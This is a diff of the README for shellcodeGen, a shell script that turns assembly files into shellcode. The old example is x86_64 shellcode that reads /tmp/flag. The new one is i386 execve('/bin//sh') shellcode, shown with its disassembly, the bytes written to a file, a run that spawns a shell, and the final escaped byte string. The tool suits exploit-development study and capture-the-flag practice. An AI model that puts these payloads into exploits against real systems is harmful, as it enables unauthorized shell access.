@@ -1,8 +1,8 @@
 # shellcodeGen
-  This shell script facilitates the generation of shellcode. It assists in crafting shellcode effortlessly from a file with the extension 's', which contains code written in either att or intel syntax.
+  This shell script facilitates the generation of shellcode. It assists in crafting shellcode effortlessly from stdin or a file with the extension 's', which contains code written in either att or intel syntax.
 
 ## Programs Used Within The Program
-  Of course, there have been many more programs used, but the following are directly relevant to generating shellcode.
+  Many additional programs have been utilized; however, the following are directly pertinent to the process of generating shellcode.
 
 - as
 - ld
@@ -12,96 +12,107 @@
 
 ## Useage Guide
 ```
-./shellcode-gen.sh -f TARGET_FILE_NAME [-o -a -t -s -r -k]
-./shellcode-gen.sh -h
 <options>
--h                  : Print this message and then exit.
--f TARGET_FILE_NAME : Specify the file with the extension 's' for generating shellcode.
--o OUTPUT_FILE_NAME : (Optional) Save the completed shellcode to the specified file.
--a ARCHITECTURE     : (Optional) Specify architecture(x86_64(default) or i386).
--t LITERAL_TYPE     : (Optional) Specify the literal type(str(default), arr, or all) of bytes of shellcode to output.
--s SYNTAX           : (Optional) Specify syntax(att(default) or intel).
--r                  : (Optional) Run shell code by making it an executable file.
--k                  : (Optional) Keep the intermediate files.
+TARGET_FILE_NAME       : (Optional) Specify the file with the extension 's' for generating shellcode.
+-a --arch ARCHITECTURE : (Optional) Specify architecture(x86_64(default) or i386).
+-t --type LITERAL_TYPE : (Optional) Specify the literal type(str(default), arr, or bytes) of bytes of shellcode to output.
+-s --syntax SYNTAX     : (Optional) Specify syntax(att(default) or intel).
+-r --run               : (Optional) Run shell code by making it an executable file.
+-k --keep              : (Optional) Keep the intermediate files.
+
+-h --help              : Print this message and then exit.
+
 <exit code>
 0 : Success.
 1 : Failure.
 ```
+- Assembly code can be provided via stdin if a target file name is not specified.
+- The location of the target file name is adjustable, similar to other options.
+- Only the final output is sent to stdout; all other messages are directed to stderr.
 
 ## Example
-orw.s :
-```bash
-$ cat orw.s
+### Use With I/O Redirection
+```
+$ cat execve.s
 .section .text
 .global _start
 _start:
-pushq $0x67
-movabsq $0x616c662f706d742f, %rax
-pushq %rax
-movq %rsp, %rdi
-xorq %rsi, %rsi
-xorq %rdx, %rdx
-pushq $0x02
-popq %rax
-syscall
+xorl %ecx, %ecx
+pushl %ecx
+pushl $0x68732F6E
+pushl $0x69622F2F
+pushl $0x16
+popl %eax
+sarl $1, %eax
+movl %ecx, %edx
+movl %esp, %ebx
+int $0x80
 
-movq %rax, %rdi
-leaq -0x30(%rsp), %rsi
-pushq $0x30
-popq %rdx
-xorq %rax, %rax
-syscall
-
-movq $0x01, %rdi
-movq %rdi, %rax
-syscall
-```
-
-run :
-```bash
-$ ./shellcode-gen.sh -f orw.s -t all
+$ cat execve.s | ./shellcode-gen -a i386 -t bytes > output
 [-------------------- ASSEMBLY WITH MACHINE CODE --------------------]
 
-orw.o:     file format elf64-x86-64
+temp_shellcode_gen6029.o:     file format elf32-i386
 
 
 Disassembly of section .text:
 
-0000000000000000 <_start>:
-   0:	6a 67                	push   $0x67
-   2:	48 b8 2f 74 6d 70 2f 	movabs $0x616c662f706d742f,%rax
-   9:	66 6c 61 
-   c:	50                   	push   %rax
-   d:	48 89 e7             	mov    %rsp,%rdi
-  10:	48 31 f6             	xor    %rsi,%rsi
-  13:	48 31 d2             	xor    %rdx,%rdx
-  16:	6a 02                	push   $0x2
-  18:	58                   	pop    %rax
-  19:	0f 05                	syscall
-  1b:	48 89 c7             	mov    %rax,%rdi
-  1e:	48 8d 74 24 d0       	lea    -0x30(%rsp),%rsi
-  23:	6a 30                	push   $0x30
-  25:	5a                   	pop    %rdx
-  26:	48 31 c0             	xor    %rax,%rax
-  29:	0f 05                	syscall
-  2b:	48 c7 c7 01 00 00 00 	mov    $0x1,%rdi
-  32:	48 89 f8             	mov    %rdi,%rax
-  35:	0f 05                	syscall
+00000000 <_start>:
+   0:	31 c9                	xor    %ecx,%ecx
+   2:	51                   	push   %ecx
+   3:	68 6e 2f 73 68       	push   $0x68732f6e
+   8:	68 2f 2f 62 69       	push   $0x69622f2f
+   d:	6a 16                	push   $0x16
+   f:	58                   	pop    %eax
+  10:	d1 f8                	sar    %eax
+  12:	89 ca                	mov    %ecx,%edx
+  14:	89 e3                	mov    %esp,%ebx
+  16:	cd 80                	int    $0x80
 
-NOTE : Whitespace in C : 
+NOTE : Whitespace in C :
   0x09(Horizontal Tab), 0x0A(Line Feed),       0x0B(Vertical Tab),
   0x0C(Form Feed),      0x0D(Carriage Return), 0x20(Space)
 
 [-------------------------------------------------------------------]
 
-Do you want to make it into SHELLCODE? [Y/n]: y
 
-bytes length : 55 (0x37)
+$ xxd output                                              
+00000000: 31c9 5168 6e2f 7368 682f 2f62 696a 1658  1.Qhn/shh//bij.X
+00000010: d1f8 89ca 89e3 cd80                      ........
+```
 
-String Literal: 
-\x6A\x67\x48\xB8\x2F\x74\x6D\x70\x2F\x66\x6C\x61\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x6A\x02\x58\x0F\x05\x48\x89\xC7\x48\x8D\x74\x24\xD0\x6A\x30\x5A\x48\x31\xC0\x0F\x05\x48\xC7\xC7\x01\x00\x00\x00\x48\x89\xF8\x0F\x05
+### Run Your Shellcode
+```
+./shellcode-gen -r -a i386 execve.s      
+[-------------------- ASSEMBLY WITH MACHINE CODE --------------------]
 
-Array Literal: 
-0x6A, 0x67, 0x48, 0xB8, 0x2F, 0x74, 0x6D, 0x70, 0x2F, 0x66, 0x6C, 0x61, 0x50, 0x48, 0x89, 0xE7, 0x48, 0x31, 0xF6, 0x48, 0x31, 0xD2, 0x6A, 0x02, 0x58, 0x0F, 0x05, 0x48, 0x89, 0xC7, 0x48, 0x8D, 0x74, 0x24, 0xD0, 0x6A, 0x30, 0x5A, 0x48, 0x31, 0xC0, 0x0F, 0x05, 0x48, 0xC7, 0xC7, 0x01, 0x00, 0x00, 0x00, 0x48, 0x89, 0xF8, 0x0F, 0x05
+execve.o:     file format elf32-i386
 
+
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:	31 c9                	xor    %ecx,%ecx
+   2:	51                   	push   %ecx
+   3:	68 6e 2f 73 68       	push   $0x68732f6e
+   8:	68 2f 2f 62 69       	push   $0x69622f2f
+   d:	6a 16                	push   $0x16
+   f:	58                   	pop    %eax
+  10:	d1 f8                	sar    %eax
+  12:	89 ca                	mov    %ecx,%edx
+  14:	89 e3                	mov    %esp,%ebx
+  16:	cd 80                	int    $0x80
+
+NOTE : Whitespace in C :
+  0x09(Horizontal Tab), 0x0A(Line Feed),       0x0B(Vertical Tab),
+  0x0C(Form Feed),      0x0D(Carriage Return), 0x20(Space)
+
+[-------------------------------------------------------------------]
+
+[-------------------------- run YOUR CODE --------------------------]
+$ whoami
+suhyeon
+$ 
+[-------------------------------------------------------------------]
+
+\x31\xC9\x51\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x6A\x16\x58\xD1\xF8\x89\xCA\x89\xE3\xCD\x80
 ```
